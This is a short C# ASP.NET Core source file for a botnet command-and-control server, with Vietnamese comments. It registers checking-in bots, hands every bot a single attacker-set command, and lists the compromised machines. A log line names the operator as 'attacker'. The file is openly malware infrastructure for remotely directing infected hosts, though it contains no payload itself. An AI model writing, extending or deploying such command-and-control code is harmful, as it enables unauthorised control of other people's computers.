using Microsoft.AspNetCore.Mvc;
using System.Collections.Concurrent;

namespace CncServer.Controllers
{
    // Model cho request đặt lệnh
    public class SetCommandRequest
    {
        public string Command { get; set; }
    }

    public class BotInfo
    {
        public string BotId { get; set; }
        public DateTime LastSeen { get; set; }
        public string Status { get; set; }
    }

    [ApiController]
    [Route("bot")]
    public class BotController : ControllerBase
    {
        private static readonly ConcurrentDictionary<string, BotInfo> _bots = new ConcurrentDictionary<string, BotInfo>();
        private static string _command = "idle";

        [HttpPost("checkin")]
        public IActionResult CheckIn([FromBody] BotInfo botInfo)
        {
            botInfo.LastSeen = DateTime.UtcNow;
            _bots[botInfo.BotId] = botInfo;
            Console.WriteLine($"[+] Bot {botInfo.BotId} checked in. Status: {botInfo.Status}. Total bots: {_bots.Count}");
            return Ok();
        }

        [HttpGet("getcommand")]
        public IActionResult GetCommand(string botId)
        {
            if (_bots.ContainsKey(botId))
            {
                return Ok(new { command = _command });
            }
            return NotFound();
        }

        // === NÂNG CẤP: Nhận một model JSON thay vì chuỗi thô ===
        [HttpPost("setcommand")]
        public IActionResult SetCommand([FromBody] SetCommandRequest request)
        {
            if (string.IsNullOrWhiteSpace(request?.Command))
            {
                return BadRequest("Command model is invalid.");
            }
            _command = request.Command.ToLower(); // Chuẩn hóa lệnh thành chữ thường
            Console.WriteLine($"\n[*] New command issued by attacker: '{_command}'\n");
            return Ok($"Command set to: {_command}");
        }

        [HttpGet("list")]
        public IActionResult ListBots()
        {
            return Ok(_bots.Values);
        }
    }
}